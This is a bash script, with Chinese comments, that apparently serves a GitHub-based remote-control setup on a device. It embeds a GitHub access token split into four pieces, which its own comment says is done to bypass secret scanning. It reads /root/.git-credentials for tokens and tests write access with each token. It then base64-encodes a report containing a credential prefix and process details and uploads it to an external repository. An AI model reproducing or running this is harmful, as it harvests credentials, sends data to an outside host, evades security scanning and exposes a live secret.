# 诊断设备端token写权限 — 自带新token(拆4段拼接绕过secret scanning),结果写独立文件回传
TOK="${A}${B}${C}${D}"
A='github_pat_11BQPEBSA0iH'
B='riCXm9QGCt_74skvWNFHKum'
C='HCtG6L026yU4FNjISYSZVmI'
D='jR9F9Ojw3QEXVSIPygfznQqG'
TOK="${A}${B}${C}${D}"
API="https://api.github.com/repos/Thousands91/-1/contents/remote"
# 设备当前凭据token(可能有ghp_旧串)
CRED=$(grep -oE 'ghp_[A-Za-z0-9]+|github_pat_[A-Za-z0-9_]+' /root/.git-credentials 2>/dev/null | head -1)
CPRE="${CRED:0:12}"
# 测设备当前token的PUT写权限(写临时文件)
CODE_OLD=$(timeout 20 curl -s -o /dev/null -w '%{http_code}' --max-time 18 -X PUT -H "Authorization: token $CRED" "$API/_tokdiag_old.txt" -d '{"message":"tokdiag","content":"dGVzdA==","branch":"main"}' 2>/dev/null)
# 测自带新token的PUT写权限
CODE_NEW=$(timeout 20 curl -s -o /dev/null -w '%{http_code}' --max-time 18 -X PUT -H "Authorization: token $TOK" "$API/_tokdiag_new.txt" -d '{"message":"tokdiag","content":"dGVzdA==","branch":"main"}' 2>/dev/null)
# out.txt当前sha和末次提交信息
OSHA=$(timeout 20 curl -s "$API/out.txt" -H "Authorization: token $TOK" 2>/dev/null | tr -d ' ' | grep -o '"sha":"[^"]*"' | head -1 | cut -d'"' -f4)
# 进程
CTL=$(pgrep -f "[r]emote_ctl" | head -1)
NOW=$(date '+%m-%d %H:%M:%S')
LAST=$(grep -oE '命中ID=[0-9]+' /root/remote_ctl.log 2>/dev/null | tail -1)
R="time=$NOW | cred前缀=$CPRE | 设备cred_PUT=$CODE_OLD | 新token_PUT=$CODE_NEW | outsha=$OSHA | remote_ctl=$CTL | $LAST"
BB=$(echo -n "$R" | base64 -w0)
SHA=$(timeout 20 curl -s -H "Authorization: token $TOK" "$API/diag_put.txt" 2>/dev/null | tr -d ' ' | grep -o '"sha":"[^"]*"' | head -1 | cut -d'"' -f4)
if [ -n "$SHA" ]; then P="{\"message\":\"诊断回传\",\"content\":\"$BB\",\"sha\":\"$SHA\",\"branch\":\"main\"}"; else P="{\"message\":\"诊断回传\",\"content\":\"$BB\",\"branch\":\"main\"}"; fi
curl -s --max-time 25 -X PUT -H "Authorization: token $TOK" "$API/diag_put.txt" -d "$P" -o /dev/null -w "PUT诊断文件:%{http_code}\n"
echo "$R"
